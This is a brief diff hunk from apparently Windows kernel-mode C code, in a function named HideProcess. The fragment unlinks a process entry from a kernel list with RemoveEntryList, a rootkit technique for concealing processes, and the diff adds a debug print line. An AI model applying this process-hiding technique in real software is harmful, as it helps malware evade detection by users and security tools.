@@ -68,6 +68,7 @@ VOID HideProcess(char* ProcessName)
 			if (MmIsAddressValid(Temp))
 			{
 				RemoveEntryList(Temp);
+				DbgPrint("%s\r\n", &ProcessName);
 			}
 			break;
 		}
